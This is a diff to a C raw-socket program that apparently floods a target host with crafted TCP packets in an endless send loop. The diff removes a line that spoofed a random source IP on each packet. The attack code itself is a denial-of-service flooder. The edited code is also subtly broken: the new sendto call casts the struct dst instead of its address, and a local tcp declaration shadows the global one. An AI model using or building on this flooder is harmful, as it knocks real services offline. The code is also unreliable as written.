@@ -65,7 +65,7 @@ static void set_ip_header(struct sockaddr_in *dst)
 
  static void set_tcp_header(struct sockaddr_in *dst){
     // TCP Layer
-    tcp = (struct tcphdr*)(buf + sizeof(struct ip));
+    struct tcphdr *tcp = (struct tcphdr*)(buf + sizeof(struct ip));
     tcp->source = htons(8888);
     tcp->dest = dst->sin_port;
     tcp->seq = random();
@@ -100,7 +100,7 @@ int main(int argc, char *argv[])
     int sockfd;
     
     struct hostent *target;
-    struct sockaddr_in *dst;
+    struct sockaddr_in dst;
  
     if(argc != 4){
         fprintf(stdout, "%s\n",usage);
@@ -108,7 +108,7 @@ int main(int argc, char *argv[])
     }
     // Clear data payload
     memset(buf, 0, sizeof(buf));
-    memset(dst,0,sizeof(struct sockaddr_in));
+    memset(&dst,0,sizeof(struct sockaddr_in));
 
 
     if((target = gethostbyname(argv[1])) == NULL){
@@ -134,12 +134,11 @@ int main(int argc, char *argv[])
     
 	// Loop
     while(1){
-    	ip->ip_src.s_addr = random();
-        if(sendto(sockfd, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
+        if(sendto(sockfd, buf, sizeof(buf), 0, (struct sockaddr *)dst, sizeof(dst)) < 0){
             fprintf(stderr, "Error during packet send.\n");
-            perror("sendto() error");
+            perror("sendto error");
         }else
-            printf("%lu send packgets %d to %s is OK.\n",ip->ip_src.s_addr,i,argv[2]);
+            printf("send packgets is OK.\n");
 
         usleep(PACKET_DELAY);
     }
